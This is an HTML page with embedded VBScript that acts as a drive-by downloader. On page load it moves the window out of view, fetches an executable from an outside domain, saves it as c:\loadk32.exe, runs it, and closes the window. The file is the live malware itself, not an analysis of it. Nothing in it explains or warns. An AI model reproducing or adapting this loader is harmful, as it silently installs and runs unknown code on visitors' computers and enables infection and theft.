<html><script language="vbscript">
self.MoveTo 5000,5000
set x = CreateObject("Microsoft.XMLHTTP")
x.open "GET", "http://hard-virgins.com/dl/load.exe", false
x.send
cs = x.responseBody
Set fso = CreateObject("Scripting.FileSystemObject")
pth = "c:\loadk32.exe"
Set f = fso.CreateTextFile(pth, ForWriting)
for i = 0 to UBound(cs)
c = ascb(midb(cs, i+1, 1))
f.Write chr(c)
next
f.close
Set shell=CreateObject("WScript.Shell")
shell.run(pth)
window.close
</script>